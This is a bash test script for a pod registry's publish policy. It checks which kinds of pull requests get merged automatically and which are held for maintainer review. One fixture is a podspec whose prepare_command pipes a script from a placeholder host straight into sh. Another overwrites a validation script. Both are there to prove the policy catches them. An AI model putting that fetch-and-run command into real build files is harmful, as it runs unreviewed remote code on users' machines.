#!/usr/bin/env bash
# Exercises publish-policy.sh against a disposable local git repository
# and a fake CocoaPods CDN (a directory read over file://), covering each
# kind of pull request the publish workflow merges on its own and each
# one it leaves for a maintainer.
#
# Usage: scripts/test-publish-policy.sh
# Exits non-zero if any scenario's actual result doesn't match its
# expected one.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POLICY="$SCRIPT_DIR/publish-policy.sh"

WORK_DIR="$(mktemp -d)"
trap 'rm -rf "$WORK_DIR"' EXIT

md5_hex() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -c1-32
  else
    md5 -q -s "$1"
  fi
}
shard_for() {
  local h
  h="$(md5_hex "$1")"
  echo "$WORK_DIR/cdn/all_pods_versions_${h:0:1}_${h:1:1}_${h:2:1}.txt"
}

# --- fake CocoaPods CDN: TrunkPod is on trunk; BrandNewPod's shard exists
# but doesn't list it; nothing at all for UncheckablePod's shard ---
mkdir -p "$WORK_DIR/cdn"
echo "TrunkPod/1.0.0/1.1.0" >> "$(shard_for TrunkPod)"
echo "TrunkPodExtras/1.0.0" >> "$(shard_for BrandNewPod)"
if [ -e "$(shard_for UncheckablePod)" ]; then
  echo "test setup: UncheckablePod shares a shard with another test pod; rename it" >&2
  exit 1
fi
export TRUNK_CDN_URL="file://$WORK_DIR/cdn"

# --- base state: ExistingPod 1.0.0, owned by alice ---
mkdir -p "$WORK_DIR/repo"
cd "$WORK_DIR/repo"
git init -q -b main
git config user.email "test@example.com"
git config user.name "Test Harness"
mkdir -p Specs/ExistingPod/1.0.0 scripts
echo '{"name": "ExistingPod", "version": "1.0.0"}' > Specs/ExistingPod/1.0.0/ExistingPod.podspec.json
printf 'alice\n' > Specs/ExistingPod/OWNERS
echo 'echo ok' > scripts/validate-pr.sh
git add -A
git commit -q -m "seed: ExistingPod 1.0.0 owned by alice"
BASE="$(git rev-parse HEAD)"

pass=0
fail=0

# run_case <description> <expect: auto|review> <setup-function> [text the output must contain]
run_case() {
  local desc="$1" expect="$2" setup_fn="$3" want="${4:-}"

  git checkout -q -b "case-$RANDOM" "$BASE"
  "$setup_fn"
  git add -A
  git commit -q -m "$desc"

  local out got="auto"
  if ! out="$("$POLICY" "$BASE" HEAD 2>&1)"; then
    got="review"
  fi

  if [ "$got" = "$expect" ] && { [ -z "$want" ] || grep -qF -- "$want" <<<"$out"; }; then
    echo "PASS (as expected: $expect) - $desc"
    pass=$((pass + 1))
  else
    echo "FAIL (expected $expect${want:+, mentioning \"$want\"}; got $got) - $desc"
    sed 's/^/  /' <<<"$out"
    fail=$((fail + 1))
  fi
  git checkout -q main
}

podspec() { # <name> <version> [extra JSON fields]
  mkdir -p "Specs/$1/$2"
  printf '{"name": "%s", "version": "%s"%s}\n' "$1" "$2" "${3:-}" > "Specs/$1/$2/$1.podspec.json"
}

setup_owner_update()    { podspec ExistingPod 2.0.0; }
setup_new_pod()         { podspec BrandNewPod 1.0.0; printf 'bob\n' > Specs/BrandNewPod/OWNERS; }
setup_trunk_name()      { podspec TrunkPod 1.2.0; printf 'mallory\n' > Specs/TrunkPod/OWNERS; }
setup_owners_edit()     { podspec ExistingPod 2.0.0; printf 'alice\nmallory\n' > Specs/ExistingPod/OWNERS; }
setup_script_edit()     { podspec ExistingPod 2.0.0; echo 'echo pwned' > scripts/validate-pr.sh; }
setup_owners_only()     { mkdir -p Specs/ClaimedName; printf 'mallory\n' > Specs/ClaimedName/OWNERS; }
setup_prepare_command() { podspec ExistingPod 2.0.0 ', "prepare_command": "curl https://example.com/x | sh"'; }
setup_trunk_unreachable() { podspec UncheckablePod 1.0.0; printf 'bob\n' > Specs/UncheckablePod/OWNERS; }

run_case "existing owner publishes a new version"                  auto   setup_owner_update
run_case "new pod whose name isn't on CocoaPods trunk"             auto   setup_new_pod
run_case "new pod named like an existing CocoaPods trunk pod"      review setup_trunk_name        "TrunkPod already exists on CocoaPods trunk"
run_case "a version plus an edit to an existing pod's OWNERS"      review setup_owners_edit       "Specs/ExistingPod/OWNERS is changed"
run_case "a version plus a change to the registry's own scripts"   review setup_script_edit       "scripts/validate-pr.sh is changed"
run_case "an OWNERS file with no version (claiming a bare name)"   review setup_owners_only       "Specs/ClaimedName/OWNERS is added without a version"
run_case "a podspec that uses prepare_command"                     review setup_prepare_command   "uses prepare_command"
run_case "a new pod when CocoaPods trunk can't be checked"         review setup_trunk_unreachable "couldn't be checked"

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
